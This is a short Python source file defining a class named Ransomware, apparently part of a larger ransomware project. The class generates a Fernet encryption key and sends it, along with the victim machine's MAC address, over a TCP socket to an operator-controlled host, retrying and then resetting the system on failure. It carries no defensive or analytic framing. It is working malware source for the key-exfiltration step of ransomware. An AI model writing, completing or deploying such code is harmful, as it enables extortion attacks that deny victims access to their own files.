
from time import sleep
from cryptography.fernet import Fernet
from ..modules.system import System
from socket import socket, AF_INET, SOCK_STREAM



class Ransomware:
    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port
        self.server = socket(AF_INET, SOCK_STREAM)
        self.key = Fernet.generate_key()
        self.Private = Fernet(self.key)

    def ConnectServer(self, connected = False) -> None:
        retries = 0
        while not connected and retries < 3:
            try:
                self.server.connect((self.host, self.port))
                self.server.sendall(f'{self.Mac()}|{self.key.decode("utf-8")}'.encode('utf-8'))
                connected = True
            except:
                retries += 1
                if retries < 3:
                    sleep(10)
                else:
                    System.reset()
            finally:
                self.server.close()